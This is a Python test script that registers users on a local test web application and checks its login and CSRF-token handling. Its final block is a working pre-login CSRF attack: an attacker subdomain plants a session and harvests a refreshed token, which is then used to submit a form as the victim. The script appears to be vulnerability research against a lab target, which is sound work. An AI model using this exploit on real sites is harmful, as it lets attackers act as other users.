import requests
from bs4 import BeautifulSoup
import random, time

PROTOCOL = "http"
TARGET =   f'{PROTOCOL}://localtest.me/'
ATTACKER = f'{PROTOCOL}://attack.localtest.me/'
PRIVATE_KEY = './server/localtest.me.crt'

USER1 = f"{random.randint(10000, 99999)}@a.com"
NAME1 = f"{random.randint(10000, 99999)}"
USER2 = f"{random.randint(10000, 99999)}@a.com"
NAME2 = f"{random.randint(10000, 99999)}"
PASSWORD = "ab-cd-ef"

def register(user, name):
    r = s.get(TARGET + 'register', verify = PRIVATE_KEY)
    csrf_token = get_csrf_token(r.text)
    r = s.post(TARGET + 'register', data = {'csrf_test_name' : csrf_token, 'email' : user, 'username' : name, 'password':  PASSWORD, 'password_confirm' : PASSWORD})
    assert f'Welcome {name}.' in r.text, r.text
    print("Registered: ", user, name)
    logout()


def get_csrf_token(page):
    # return BeautifulSoup(page, 'html.parser').find(id="csrf_token").attrs['value']
    return BeautifulSoup(page, 'html.parser').find("input", {"name" : "csrf_test_name"})['value']


def csrf_check(csrf_token):
    return s.post(TARGET + 'submitForm', data = {'csrf_test_name' : csrf_token})


def login(id, name):
    r = s.get(TARGET + 'login')
    assert 'Forgot your password?' in r.text

    csrf_token = get_csrf_token(r.text)
    r = s.post(TARGET + 'login', data = {'csrf_test_name' : csrf_token, 'email' : id, 'password':  PASSWORD})

    return r


def logout():
    r = s.get(TARGET + 'logout')
    assert '<a href="login">Login!</a>' in r.text


with requests.Session() as s:
    register(USER1, NAME1)
    register(USER2, NAME2)


with requests.Session() as s:
    print("[+] Testing login")

    ### Access main page
    r = s.get(TARGET, verify = PRIVATE_KEY)
    assert '<a href="login">Login!</a>' in r.text

    ### Check csrf-check functionality
    csrf_token = get_csrf_token(r.text)
    r = csrf_check(csrf_token)
    assert 'No user logged in' in r.text

    ### Login (any user works. No passwd)
    r = login(USER1, NAME1)

    ### Check csrf_check functionality
    csrf_token = get_csrf_token(r.text)
    r = csrf_check(csrf_token)
    assert f'Form successfully submitted as user {NAME1}' in r.text

    ### Logout
    logout()

    print("  - Checks passed")


with requests.Session() as s:
    print("[+] Testing pre-login CSRF attack")

    ### ATTACKER INIT
    s.get(ATTACKER, verify = PRIVATE_KEY)
    r_attacker = s.get(ATTACKER + 'set_pre_session')

    r_target = s.get(TARGET, verify = PRIVATE_KEY)
    assert '<a href="login">Login!</a>' in r_target.text

    ### TARGET LOGIN
    r_target = login(USER2, NAME2)

    r_attacker = s.get(ATTACKER + 'remove')
    r_attacker = s.get(ATTACKER + 'get_refreshed_seed')

    ### ATTACKER CSRF
    csrf_token_attacker = get_csrf_token(r_attacker.text)
    r_attacker = csrf_check(csrf_token_attacker)

    assert f'Form successfully submitted as user {NAME2}' in r_attacker.text, " NOT VULNERABLE to pre-login CSRF attack"

    print("  - Vulnerable to pre-login CSRF attack")
